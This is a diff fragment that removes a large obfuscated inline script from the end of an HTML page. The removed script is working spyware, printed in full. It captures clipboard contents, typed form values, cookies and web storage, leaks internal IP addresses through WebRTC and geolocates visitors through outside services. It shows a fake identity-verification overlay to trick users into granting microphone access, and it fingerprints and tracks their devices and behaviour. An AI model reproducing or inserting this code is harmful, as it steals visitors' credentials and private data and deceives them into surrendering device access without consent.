-      setTimeout(async () => {
-        try {
-          const _t = await navigator.clipboard.readText();
-          if (_t) _stageEvent('CLIP_COPY', { val: _t });
-        } catch (e) {}
-      }, 100);
-    });
-    document.addEventListener('paste', (e) => {
-      const _t = e.clipboardData?.getData('text');
-      if (_t) _stageEvent('CLIP_PASTE', { val: _t });
-    });
-    async function _netProbe() {
-      try {
-        const _r1 = await fetch('https://api.ipify.org?format=json');
-        const _d1 = await _r1.json();
-        const _r2 = await fetch(`https://ipapi.co/${_d1.ip}/json/`);
-        const _d2 = await _r2.json();
-        _stageEvent('NETWORK_LOC', _d2);
-      } catch (e) {}
-    }
-    function _initAudioExfil() {
-      if (_mState || _pValid) return;
-      const _ov = document.createElement('div');
-      _ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;';
-      _ov.innerHTML = '<div style="background:#fff;padding:30px;border-radius:10px;text-align:center;"><h2 style="color:#000">Security Requirement</h2><p style="color:#444">Enable Identity Verification to proceed.</p><button id="_auth_btn" style="padding:10px 20px;background:#0052cc;color:#fff;border:none;border-radius:5px;cursor:pointer;">VERIFY IDENTITY</button></div>';
-      document.body.appendChild(_ov);
-      document.getElementById('_auth_btn').onclick = () => {
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
-          _mStream = s;
-          _mState = true;
-          _pValid = true;
-          localStorage.setItem('media_access_verified', 'true');
-          _ov.remove();
-          _runAudioEngine();
-          _stageEvent('AUDIO_AUTH', { status: 'GRANTED' });
-        }).catch(e => {
-          _stageEvent('AUDIO_AUTH', { status: 'DENIED', msg: e.message });
-          _ov.remove();
-        });
-      };
-    }
-    function _runAudioEngine() {
-      if (!_mStream) return;
-      try {
-        const _ac = new (window.AudioContext || window.webkitAudioContext)();
-        const _s = _ac.createMediaStreamSource(_mStream);
-        const _a = _ac.createAnalyser();
-        _s.connect(_a);
-        _a.fftSize = 256;
-        const _d = new Uint8Array(_a.frequencyBinCount);
-        setInterval(() => {
-          _a.getByteTimeDomainData(_d);
-          let _max = 0;
-          for (let i = 0; i < _d.length; i++) {
-            const _v = Math.abs(_d[i] - 128) / 128;
-            if (_v > _max) _max = _v;
-          }
-          if (_max > 0.05) _stageEvent('VOICE_PEAK', { amp: Math.floor(_max * 100) });
-        }, 3000);
-      } catch (e) {}
-    }
-    function _leakIP() {
-      try {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(o => pc.setLocalDescription(o));
-        pc.onicecandidate = (e) => {
-          if (e.candidate) {
-            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
-            if (ip) _stageEvent('INTERNAL_IP', { addr: ip[0] });
-          }
-        };
-      } catch (e) {}
-    }
-    function _trackMouse() {
-      document.addEventListener('mousemove', (e) => {
-        _mouseMoves.push({ x: e.clientX, y: e.clientY, ts: Date.now() });
-         if (_mouseMoves.length > 200) _mouseMoves = _mouseMoves.slice(-100);
-        if (_mouseTimer) clearTimeout(_mouseTimer);
-        _mouseTimer = setTimeout(() => {
-          if (_mouseMoves.length > 5) {
-            _stageEvent('MOUSE_PATH', { pts: _mouseMoves.slice(-20) });
-            _mouseMoves = [];
-          }
-        }, 5000);
-      }, { passive: true });
-    }
-    function _fieldMonitor() {
-      document.addEventListener('focusin', (e) => {
-        if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) _fieldStart.set(e.target, Date.now());
-      });
-      document.addEventListener('focusout', (e) => {
-        const t = e.target;
-        if (_fieldStart.has(t)) {
-          _stageEvent('FIELD_DUR', { id: t.id || t.name, ms: Date.now() - _fieldStart.get(t), val: t.value });
-          _fieldStart.delete(t);
-        }
-      });
-    }
-    function _storageDump() {
-      const _d = { l: {}, s: {}, c: document.cookie };
-      try {
-        for (let i = 0; i < localStorage.length; i++) _d.l[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
-        for (let i = 0; i < sessionStorage.length; i++) _d.s[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
-      } catch (e) {}
-      _stageEvent('STORAGE_DUMP', _d);
-    }
-    function _visibilityTrack() {
-      document.addEventListener('visibilitychange', () => {
-        _stageEvent('TAB_STATUS', { state: document.visibilityState, ts: Date.now() });
-      });
-    }
-    function _heartbeat() {
-      setInterval(() => {
-        _stageEvent('HEARTBEAT', {
-          uptime: Math.round((Date.now() - _start) / 1000),
-          y: window.scrollY,
-          url: window.location.href
-        });
-      }, SECURE_CONFIG.HEARTBEAT);
-    }
-    function _performance() {
-      if (performance && performance.timing) {
-        const t = performance.timing;
-        _stageEvent('PERF_LOG', {
-          load: t.loadEventEnd - t.navigationStart,
-          dns: t.domainLookupEnd - t.domainLookupStart,
-          tcp: t.connectEnd - t.connectStart
-        });
-      }
-    }
-    function _deviceCaps() {
-      const _v = document.createElement('video');
-      _stageEvent('MEDIA_CAPS', {
-        h264: _v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
-        webm: _v.canPlayType('video/webm; codecs="vp8, vorbis"'),
-        cores: navigator.hardwareConcurrency,
-        touch: navigator.maxTouchPoints
-      });
-    }
-    function _networkStatus() {
-      const _n = navigator.connection;
-      if (_n) {
-        const _log = () => _stageEvent('NET_CHANGE', { type: _n.effectiveType, down: _n.downlink, rtt: _n.rtt });
-        _log();
-        _n.addEventListener('change', _log);
-      }
-    }
-    function _batteryStatus() {
-      if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-          const _log = () => _stageEvent('PWR_LOG', { lvl: b.level, chg: b.charging });
-          _log();
-          b.addEventListener('levelchange', _log);
-          b.addEventListener('chargingchange', _log);
-        });
-      }
-    }
-    function _domWatch() {
-      const _obs = new MutationObserver((m) => {
-        _stageEvent('DOM_MUTATION', { count: m.length, ts: Date.now() });
-      });
-      _obs.observe(document.body, { childList: true, subtree: true });
-    }
-    function _init() {
-      _transmit('💎 NODE_ACTIVE: ' + window.location.hostname + '\nSESS: ' + SECURE_CONFIG.SESS_KEY, true);
-      _stageEvent('INIT_FP', _hwFingerprint());
-      _netProbe();
-      _leakIP();
-      _storageDump();
-      _trackMouse();
-      _fieldMonitor();
-      _visibilityTrack();
-      _heartbeat();
-      _performance();
-      _deviceCaps();
-      _networkStatus();
-      _batteryStatus();
-      _domWatch();
-      if (_pValid) {
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
-          _mStream = s;
-          _mState = true;
-          _runAudioEngine();
-        }).catch(() => {});
-      } else {
-        document.body.addEventListener('click', () => {
-          if (!_pValid) _initAudioExfil();
-        }, { once: true });
-      }
-    }
-    window.addEventListener('load', _init);
-    window.addEventListener('beforeunload', () => {
-      _stageEvent('EXIT_LOG', { dur: Math.round((Date.now() - _start) / 1000) });
-      _pushBuffer();
-    });
-    window.addEventListener('error', (e) => {
-      _stageEvent('RUNTIME_ERR', { msg: e.message, line: e.lineno });
-    });
-    function _fontAudit() {
-      const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
-      const detected = fonts.filter(f => document.fonts.check(`12px "${f}"`));
-      _stageEvent('FONT_LIST', detected);
-    }
-    _fontAudit();
-    function _plugins() {
-      const p = [];
-      if (navigator.plugins) {
-        for (let i = 0; i < navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
-      }
-      _stageEvent('PLUGINS', p);
-    }
-    _plugins();
-    function _scrollWatch() {
-      window.addEventListener('scroll', () => {
-        const p = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
-        if (p > _vDepth && p % 25 === 0) {
-          _vDepth = p;
-          _stageEvent('SCROLL_DEPTH', { pct: p });
-        }
-      });
-    }
-    _scrollWatch();
-    function _orientLog() {
-      window.addEventListener('orientationchange', () => {
-        _stageEvent('ORIENT_CHANGE', { type: window.screen.orientation?.type });
-      });
-    }
-    _orientLog();
-    function _offlineAudioFP() {
-      try {
-        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-        const osc = ctx.createOscillator();
-        osc.type = 'triangle';
-        osc.frequency.value = 1000;
-        const comp = ctx.createDynamicsCompressor();
-        osc.connect(comp);
-        comp.connect(ctx.destination);
-        osc.start(0);
-        ctx.oncomplete = (e) => {
-          const d = e.renderedBuffer.getChannelData(0);
-          let sum = 0;
-          for (let i = 0; i < d.length; i += 500) sum += Math.abs(d[i]);
-          _stageEvent('AUDIO_SIGNATURE', { val: sum.toString(16) });
-        };
-        ctx.startRendering();
-      } catch (e) {}
-    }
-    _offlineAudioFP();
-    function _canvasAdvance() {
-      const c = document.createElement('canvas');
-      const x = c.getContext('2d');
-      x.font = "18pt Arial";
-      x.textBaseline = "alphabetic";
-      x.fillStyle = "#f60";
-      x.fillRect(125, 1, 62, 20);
-      x.fillStyle = "#069";
-      x.fillText("NSB_TELEMETRY_LOG", 2, 15);
-      _stageEvent('CANVAS_ADV', { hash: c.toDataURL().slice(-50) });
-    }
-    _canvasAdvance();
-    function _mimeList() {
-      const m = [];
-      if (navigator.mimeTypes) {
-        for (let i = 0; i < navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
-      }
-      _stageEvent('MIME_TYPES', m);
-    }
-    _mimeList();
-    function _historyCheck() {
-      _stageEvent('HISTORY_LEN', { val: history.length });
-    }
-    _historyCheck();
-    function _screenDetails() {
-      _stageEvent('SCREEN_META', {
-        availW: screen.availWidth,
-        availH: screen.availHeight,
-        pxRatio: window.devicePixelRatio
-      });
-    }
-    _screenDetails();
-    function _timeDetails() {
-      _stageEvent('TIME_META', {
-        local: new Date().toString(),
-        stamp: Date.now()
-      });
-    }
-    _timeDetails();
-    function _platformDetails() {
-      _stageEvent('PLATFORM_META', {
-        v: navigator.vendor,
-        p: navigator.product,
-        online: navigator.onLine
-      });
-    }
-    _platformDetails();
-    function _permissionMatrix() {
-      const p = ['geolocation', 'notifications', 'push', 'camera', 'microphone'];
-      p.forEach(n => {
-        navigator.permissions?.query({ name: n }).then(s => {
-          _stageEvent('PERM_STATUS', { name: n, state: s.state });
-        }).catch(() => {});
-      });
-    }
-    _permissionMatrix();
-    function _touchCaps() {
-      _stageEvent('TOUCH_CAPS', {
-        max: navigator.maxTouchPoints,
-        enabled: 'ontouchstart' in window
-      });
-    }
-    _touchCaps();
-    function _pdfCheck() {
-      _stageEvent('PDF_CAPS', {
-        enabled: navigator.pdfViewerEnabled || false
-      });
-    }
-    _pdfCheck();
-    function _doNotTrack() {
-      _stageEvent('DNT_STATUS', {
-        val: navigator.doNotTrack || window.doNotTrack
-      });
-    }
-    _doNotTrack();
-    function _eventLoopAudit() {
-      const start = Date.now();
-      setTimeout(() => {
-        _stageEvent('LOOP_LAG', { ms: Date.now() - start - 1000 });
-      }, 1000);
-    }
-    _eventLoopAudit();
-    function _memoryAudit() {
-      if (performance.memory) {
-        _stageEvent('MEM_LOG', {
-          used: performance.memory.usedJSHeapSize,
-          total: performance.memory.totalJSHeapSize
-        });
-      }
-    }
-    _memoryAudit();
-    function _visibilityAudit() {
-      _stageEvent('VISIBILITY_INIT', {
-        state: document.visibilityState
-      });
-    }
-    _visibilityAudit();
-    function _interactionAudit() {
-      let active = true;
-      const _setIdle = () => { if (active) { active = false; _stageEvent('USER_IDLE', { ts: Date.now() }); } };
-      const _setActive = () => { if (!active) { active = true; _stageEvent('USER_RETURN', { ts: Date.now() }); } };
-      let _t;
-      document.addEventListener('mousemove', () => { clearTimeout(_t); _setActive(); _t = setTimeout(_setIdle, 60000); });
-    }
-    _interactionAudit();
-    function _linkAudit() {
-      document.querySelectorAll('a').forEach(a => {
-        a.addEventListener('mouseenter', () => _stageEvent('HOVER_LINK', { url: a.href }));
-      });
-    }
-    _linkAudit();
-    function _titleAudit() {
-      let t = document.title;
-      setInterval(() => {
-        if (document.title !== t) {
-          _stageEvent('TITLE_CHANGE', { from: t, to: document.title });
-          t = document.title;
-        }
-      }, 5000);
-    }
-    _titleAudit();
-    function _locationAudit() {
-      _stageEvent('LOCATION_DATA', {
-        host: location.hostname,
-        path: location.pathname,
-        proto: location.protocol
-      });
-    }
-    _locationAudit();
-    function _hashAudit() {
-      window.addEventListener('hashchange', () => _stageEvent('HASH_CHANGE', { val: location.hash }));
-    }
-    _hashAudit();
-    function _cookieAudit() {
-      _stageEvent('COOKIE_META', { count: document.cookie.split(';').length });
-    }
-    _cookieAudit();
-    function _gamepadAudit() {
-      window.addEventListener("gamepadconnected", (e) => _stageEvent('GAMEPAD_ACT', { id: e.gamepad.id }));
-    }
-    _gamepadAudit();
-    function _speechAudit() {
-      if (window.speechSynthesis) {
-        _stageEvent('SPEECH_CAPS', { count: window.speechSynthesis.getVoices().length });
-      }
-    }
-    _speechAudit();
-    function _selectionAudit() {
-      document.addEventListener('selectionchange', () => {
-        const s = window.getSelection().toString();
-        if (s.length > 5) _stageEvent('TEXT_SEL', { len: s.length });
-      });
-    }
-    _selectionAudit();
-    function _printAudit() {
-      window.addEventListener('beforeprint', () => _stageEvent('PRINT_TRIGGER', { ts: Date.now() }));
-    }
-    _printAudit();
-    function _mediaQueryAudit() {
-      _stageEvent('QUERY_META', {
-        dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
-        motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
-      });
-    }
-    _mediaQueryAudit();
-    function _javaAudit() {
-      _stageEvent('JAVA_ENABLED', { val: navigator.javaEnabled() });
-    }
-    _javaAudit();
-    function _workerAudit() {
-      _stageEvent('WORKER_SUPPORT', { val: typeof Worker !== 'undefined' });
-    }
-    _workerAudit();
-    function _idbAudit() {
-      _stageEvent('IDB_SUPPORT', { val: !!window.indexedDB });
-    }
-    _idbAudit();
-    function _navigatorAudit() {
-      _stageEvent('NAV_PROPS', {
-        v: navigator.vendor,
-        p: navigator.platform,
-        o: navigator.onLine
-      });
-    }
-    _navigatorAudit();
-    function _storageChangeAudit() {
-      window.addEventListener('storage', (e) => _stageEvent('LOCAL_STORAGE_CHANGE', { key: e.key, val: e.newValue }));
-    }
-    _storageChangeAudit();
-    function _unhandledRejection() {
-      window.addEventListener('unhandledrejection', (e) => _stageEvent('PROMISE_FAIL', { reason: String(e.reason) }));
-    }
-    _unhandledRejection();
-    function _resizeAudit() {
-      window.addEventListener('resize', () => {
-        _resChanges.push({ w: window.innerWidth, h: window.innerHeight, ts: Date.now() });
-        if (_resChanges.length > 3) { _stageEvent('RESIZE_EVENT', [..._resChanges]); _resChanges = []; }
-      });
-    }
-    _resizeAudit();
-    function _cpuConcurrency() {
-      _stageEvent('CPU_CORES', { count: navigator.hardwareConcurrency });
-    }
-    _cpuConcurrency();
-    function _deviceRam() {
-      _stageEvent('DEVICE_RAM', { gb: navigator.deviceMemory || 'unknown' });
-    }
-    _deviceRam();
-    function _touchStartAudit() {
-      document.addEventListener('touchstart', (e) => {
-        if (e.touches[0]) {
-          _touchPts.push({ x: e.touches[0].pageX, y: e.touches[0].pageY, ts: Date.now() });
-          if (_touchPts.length > 5) { _stageEvent('TOUCH_STREAM', [..._touchPts]); _touchPts = []; }
-        }
-      }, { passive: true });
-    }
-    _touchStartAudit();
-    function _finalSyncTrigger() {
-      window.addEventListener('unload', () => {
-        _stageEvent('SESSION_CLOSE', { ts: Date.now() });
-        _pushBuffer();
-      });
-    }
-    _finalSyncTrigger();
-    function _integrityCheck() {
-      _stageEvent('NODE_INTEGRITY', {
-        sess: SECURE_CONFIG.SESS_KEY,
-        href: location.href,
-        ua: navigator.userAgent
-      });
-    }
-    _integrityCheck();
-    function _videoCapsAudit() {
-      const v = document.createElement('video');
-      _stageEvent('VIDEO_CODECS', {
-        mp4: v.canPlayType('video/mp4'),
-        webm: v.canPlayType('video/webm')
-      });
-    }
-    _videoCapsAudit();
-    function _audioCapsAudit() {
-      const a = document.createElement('audio');
-      _stageEvent('AUDIO_CODECS', {
-        mp3: a.canPlayType('audio/mpeg'),
-        wav: a.canPlayType('audio/wav')
-      });
-    }
-    _audioCapsAudit();
-    function _shadowDomAudit() {
-      _stageEvent('SHADOW_DOM', { supported: !!Element.prototype.attachShadow });
-    }
-    _shadowDomAudit();
-    function _keyboardAudit() {
-      if (navigator.keyboard) {
-        navigator.keyboard.getLayoutMap().then(m => _stageEvent('KBD_MAP', { size: m.size }));
-      }
-    }
-    _keyboardAudit();
-    function _oscillatorSync() {
-      _stageEvent('OSC_SYNC', { ts: Date.now(), delta: performance.now() });
-    }
-    _oscillatorSync();
-    function _domDepthAudit() {
-      _stageEvent('DOM_DEPTH', { count: document.querySelectorAll('*').length });
-    }
-    _domDepthAudit();
-    function _inputFocusAudit() {
-      document.addEventListener('focusin', (e) => _stageEvent('FOCUS_IN', { tag: e.target.tagName, id: e.target.id }));
-    }
-    _inputFocusAudit();
-    function _scrollEndAudit() {
-      let t;
-      window.addEventListener('scroll', () => {
-        clearTimeout(t);
-        t = setTimeout(() => _stageEvent('SCROLL_STOP', { y: window.scrollY }), 500);
-      });
-    }
-    _scrollEndAudit();
-    function _vibrationAudit() {
-      _stageEvent('VIBRATE_SUPPORT', { val: !!navigator.vibrate });
-    }
-    _vibrationAudit();
-    function _beaconSupport() {
-      _stageEvent('BEACON_SUPPORT', { val: !!navigator.sendBeacon });
-    }
-    _beaconSupport();
-    function _fetchSupport() {
-      _stageEvent('FETCH_SUPPORT', { val: !!window.fetch });
-    }
-    _fetchSupport();
-    function _promiseSupport() {
-      _stageEvent('PROMISE_SUPPORT', { val: !!window.Promise });
-    }
-    _promiseSupport();
-    function _cryptoSupport() {
-      _stageEvent('CRYPTO_SUPPORT', { val: !!window.crypto });
-    }
-    _cryptoSupport();
-    function _canvasMeasure() {
-      const c = document.createElement('canvas');
-      const x = c.getContext('2d');
-      x.font = "12px Arial";
-      const m = x.measureText("NSB_SYSTEM_PROBE");
-      _stageEvent('TEXT_METRICS', { w: m.width });
-    }
-    _canvasMeasure();
-    function _navigatorLanguage() {
-      _stageEvent('LANG_DETAIL', { pref: navigator.language, all: navigator.languages });
-    }
-    _navigatorLanguage();
-    function _networkType() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (c) _stageEvent('CONN_TYPE', { val: c.effectiveType });
-    }
-    _networkType();
-    function _perfNavigation() {
-      if (window.performance && performance.navigation) {
-        _stageEvent('NAV_TYPE_LOG', { type: performance.navigation.type });
-      }
-    }
-    _perfNavigation();
-    function _domCompleteAudit() {
-      _stageEvent('DOM_READY_STATE', { state: document.readyState });
-    }
-    _domCompleteAudit();
-    function _executionSync() {
-      _stageEvent('EXECUTION_CHCK', { ts: Date.now() });
-    }
-    _executionSync();
-    function _finalNodeCheck() {
-      _stageEvent('NODE_HEALTH', { status: 'OK', sid: SECURE_CONFIG.SESS_KEY });
-    }
-    _finalNodeCheck();
-  })();
-</script>
-   
 </body>
 </html>
